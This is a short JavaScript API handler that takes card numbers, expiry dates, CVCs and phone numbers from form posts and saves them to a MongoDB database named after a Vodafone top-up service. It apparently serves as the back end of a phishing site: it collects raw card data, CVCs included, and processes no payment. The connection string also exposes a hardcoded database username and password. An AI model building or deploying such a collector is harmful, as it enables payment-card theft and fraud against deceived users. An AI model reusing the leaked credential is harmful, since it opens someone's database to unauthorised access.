import { MongoClient } from "mongodb";

export default async function handler(req, res) {
  if (req.method !== "POST") {
    res.status(405).end(); // Method Not Allowed
    return;
  }

  const { cardNumber, expiry, cvc, phoneNumber } = req.body;

  try {
    const client = await MongoClient.connect(
      "mongodb+srv://jags:fblikz5frQYIplIS@vodafone-kolay-paket-yu.av74aug.mongodb.net/vodafone",
      {
        useNewUrlParser: true,
        useUnifiedTopology: true,
        serverSelectionTimeoutMS: 50000,
      }
    );

    const db = client.db("vodafone-kolay-paket-yukle");

    await db.collection("people").insertOne({ phoneNumber });
    await db.collection("credit_cards").insertOne({ cardNumber, expiry, cvc });

    client.close();

    res.status(200).json({ message: "Başarıyla kaydedildi" });
  } catch (error) {
    console.error(error);
    res.status(500).json({ message: "Bir hata oluştu" });
  }
}
